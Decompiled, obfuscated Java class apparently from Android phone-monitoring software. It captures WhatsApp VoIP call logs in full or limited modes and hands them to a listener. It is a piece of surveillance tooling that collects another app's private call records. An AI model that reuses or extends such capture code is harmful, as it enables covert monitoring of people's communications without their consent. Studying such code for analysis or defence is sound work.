package com.vvt.capture.wa.voip.calllog;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.wa.voip.calllog.full.WhatsAppCallLogQuery;
import com.vvt.capture.wa.voip.calllog.limited.LimitedWhatsAppCallLogQuery;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private String c;
  private e d;
  private f e;
  
  public a(String paramString1, com.vvt.base.a parama, RunningMode paramRunningMode, Context paramContext, com.vvt.n.a.b paramb, String paramString2)
  {
    this.c = paramString1;
    this.b = parama;
    Object localObject = RunningMode.FULL;
    boolean bool;
    if (paramRunningMode == localObject)
    {
      bool = a;
      if (bool) {}
      localObject = new com/vvt/capture/wa/voip/calllog/full/a;
      ((com.vvt.capture.wa.voip.calllog.full.a)localObject).<init>();
      this.d = ((e)localObject);
      localObject = new com/vvt/capture/wa/voip/calllog/full/WhatsAppCallLogQuery;
      ((WhatsAppCallLogQuery)localObject).<init>();
      this.e = ((f)localObject);
    }
    for (;;)
    {
      return;
      localObject = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject)
      {
        bool = a;
        if (bool) {}
        localObject = new com/vvt/capture/wa/voip/calllog/limited/a;
        ((com.vvt.capture.wa.voip.calllog.limited.a)localObject).<init>(paramb);
        this.d = ((e)localObject);
        localObject = new com/vvt/capture/wa/voip/calllog/limited/LimitedWhatsAppCallLogQuery;
        String str = this.c;
        ((LimitedWhatsAppCallLogQuery)localObject).<init>(str, paramString2);
        this.e = ((f)localObject);
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool2 = localObject instanceof com.vvt.capture.wa.a.a;
      if (bool2)
      {
        localObject = b.a((com.vvt.capture.wa.a.a)localObject);
        localArrayList.add(localObject);
      }
    }
    Object localObject = this.b;
    if (localObject != null)
    {
      bool1 = k();
      if (bool1)
      {
        bool1 = a;
        if (bool1) {}
        localObject = this.b;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
    for (;;)
    {
      return;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  protected e b()
  {
    return this.d;
  }
  
  protected f c()
  {
    return this.e;
  }
  
  protected String d()
  {
    return "WhatsAppCallLogCapture";
  }
  
  protected String e()
  {
    return this.c;
  }
  
  protected String f()
  {
    return "whatsapp_calllog.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wa/voip/calllog/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */